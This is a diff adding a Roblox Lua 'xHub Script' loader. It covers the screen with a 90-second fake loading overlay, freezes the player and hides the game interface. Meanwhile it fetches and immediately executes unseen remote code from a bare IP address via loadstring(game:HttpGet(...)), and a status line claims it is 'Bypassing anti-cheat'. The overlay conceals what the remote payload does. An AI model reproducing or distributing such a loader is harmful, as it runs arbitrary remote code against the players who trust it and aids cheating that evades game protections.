@@ -1,0 +1,205 @@
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+
+local LOADING_TIME = 90 
+local TITLE_TEXT = "xHub Script"
+local targetUrl = "http://72.56.90.233:3910/api/run/eyJpZCI6ImM3MGQ4MDk5LTI4ZjUtNGQ0Mi04MmUwLThlMmY3ZmFhM2M1MSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"
+
+if CoreGui:FindFirstChild("xHubLoadingScreen") then
+    CoreGui.xHubLoadingScreen:Destroy()
+end
+
+local player = Players.LocalPlayer
+task.spawn(function()
+    if player and player.Character then
+        local hum = player.Character:WaitForChild("Humanoid", 5)
+        if hum then
+            hum.WalkSpeed = 0
+            hum.JumpPower = 0
+        end
+    end
+end)
+
+pcall(function()
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+end)
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "xHubLoadingScreen"
+screenGui.IgnoreGuiInset = true
+screenGui.DisplayOrder = 1000000
+screenGui.Parent = CoreGui
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(1, 0, 1, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+local starsContainer = Instance.new("Frame")
+starsContainer.Size = UDim2.new(1, 0, 1, 0)
+starsContainer.BackgroundTransparency = 1
+starsContainer.Parent = mainFrame
+
+local function spawnStar()
+    local star = Instance.new("Frame")
+    star.Size = UDim2.new(0, math.random(1, 2), 0, math.random(1, 2))
+    star.Position = UDim2.new(math.random(), 0, math.random(), 0)
+    star.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    star.BorderSizePixel = 0
+    star.BackgroundTransparency = 1
+    star.Parent = starsContainer
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(1, 0)
+    corner.Parent = star
+
+    local duration = math.random(4, 7)
+    local moveTarget = UDim2.new(star.Position.X.Scale + math.random(-5, 5)/100, 0, star.Position.Y.Scale + math.random(-5, 5)/100, 0)
+    
+    -- Появление
+    TweenService:Create(star, TweenInfo.new(duration/2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundTransparency = math.random(2, 5)/10}):Play()
+    -- Движение
+    TweenService:Create(star, TweenInfo.new(duration, Enum.EasingStyle.Linear), {Position = moveTarget}):Play()
+    
+    task.delay(duration/2, function()
+        -- Исчезновение
+        local twin = TweenService:Create(star, TweenInfo.new(duration/2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundTransparency = 1})
+        twin:Play()
+        twin.Completed:Connect(function() star:Destroy() end)
+    end)
+end
+
+task.spawn(function()
+    for i = 1, 50 do spawnStar() end -- Начальное кол-во
+    while mainFrame.Parent do
+        spawnStar()
+        task.wait(0.2)
+    end
+end)
+
+local ring = Instance.new("Frame")
+ring.Size = UDim2.new(0, 250, 0, 250)
+ring.AnchorPoint = Vector2.new(0.5, 0.5)
+ring.Position = UDim2.new(0.5, 0, 0.4, 0)
+ring.BackgroundTransparency = 1
+ring.Parent = mainFrame
+local ringStroke = Instance.new("UIStroke")
+ringStroke.Thickness = 1.5
+ringStroke.Color = Color3.fromRGB(80, 80, 120)
+ringStroke.Transparency = 0.5
+ringStroke.Parent = ring
+Instance.new("UICorner", ring).CornerRadius = UDim.new(1, 0)
+TweenService:Create(ring, TweenInfo.new(15, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {Rotation = 360}):Play()
+
+local title = Instance.new("TextLabel")
+title.Text = TITLE_TEXT
+title.Font = Enum.Font.GothamBlack
+title.TextSize = 45
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Size = UDim2.new(1, 0, 0, 60)
+title.Position = UDim2.new(0.5, 0, 0.4, 0)
+title.AnchorPoint = Vector2.new(0.5, 0.5)
+title.BackgroundTransparency = 1
+title.Parent = mainFrame
+
+local barBg = Instance.new("Frame")
+barBg.Size = UDim2.new(0.4, 0, 0, 3)
+barBg.AnchorPoint = Vector2.new(0.5, 0.5)
+barBg.Position = UDim2.new(0.5, 0, 0.65, 0)
+barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+barBg.BorderSizePixel = 0
+barBg.Parent = mainFrame
+Instance.new("UICorner", barBg)
+
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBg
+Instance.new("UICorner", barFill)
+
+local statusText = Instance.new("TextLabel")
+statusText.Text = "Loading system..."
+statusText.Font = Enum.Font.Gotham
+statusText.TextSize = 14
+statusText.TextColor3 = Color3.fromRGB(150, 150, 180)
+statusText.Size = UDim2.new(1, 0, 0, 20)
+statusText.Position = UDim2.new(0, 0, -6, 0)
+statusText.BackgroundTransparency = 1
+statusText.Parent = barBg
+
+local percentText = Instance.new("TextLabel")
+percentText.Text = "0%"
+percentText.Font = Enum.Font.GothamBold
+percentText.TextSize = 14
+percentText.TextColor3 = Color3.fromRGB(70, 70, 90)
+percentText.Position = UDim2.new(0, 0, 2, 0)
+percentText.Size = UDim2.new(1, 0, 0, 20)
+percentText.BackgroundTransparency = 1
+percentText.Parent = barBg
+
+-- === 3. СИСТЕМА УВЕДОМЛЕНИЙ ===
+local notifyContainer = Instance.new("Frame")
+notifyContainer.Size = UDim2.new(0, 300, 1, 0)
+notifyContainer.Position = UDim2.new(1, -310, 0, 0)
+notifyContainer.BackgroundTransparency = 1
+notifyContainer.Parent = screenGui
+Instance.new("UIListLayout", notifyContainer).VerticalAlignment = Enum.VerticalAlignment.Bottom
+
+local function sendNotification(titleMsg, msg)
+    local n = Instance.new("Frame")
+    n.Size = UDim2.new(1, 0, 0, 60)
+    n.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    n.Parent = notifyContainer
+    Instance.new("UICorner", n)
+    local s = Instance.new("UIStroke", n) s.Color = Color3.fromRGB(100, 150, 255) s.Transparency = 0.5
+    
+    local t = Instance.new("TextLabel", n)
+    t.Text = titleMsg .. ": " .. msg
+    t.Size = UDim2.new(1, -20, 1, 0)
+    t.Position = UDim2.new(0, 10, 0, 0)
+    t.TextColor3 = Color3.fromRGB(255, 255, 255)
+    t.BackgroundTransparency = 1
+    t.TextWrapped = true
+    t.Font = Enum.Font.GothamMedium
+    t.TextSize = 14
+    
+    task.delay(4, function() n:Destroy() end)
+end
+
+-- === 4. ЛОГИКА ===
+
+-- Моментальный запуск скрипта
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet(targetUrl))()
+    end)
+end)
+
+-- Анимация загрузки
+task.spawn(function()
+    local steps = 100
+    for i = 1, steps do
+        task.wait(LOADING_TIME / steps)
+        percentText.Text = i .. "%"
+        barFill.Size = UDim2.new(i/100, 0, 1, 0)
+        
+        if i == 15 then statusText.Text = "Connecting to server..." end
+        if i == 45 then statusText.Text = "Bypassing anti-cheat..." end
+        if i == 85 then statusText.Text = "Finalizing..." end
+    end
+    
+    sendNotification("System", "Script fully loaded!")
+    task.wait(1)
+    
+    -- Убираем экран и размораживаем
+    mainFrame:Destroy()
+    if player and player.Character then
+        local hum = player.Character:FindFirstChild("Humanoid")
+        if hum then hum.WalkSpeed = 16 hum.JumpPower = 50 end
+    end
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
+end)
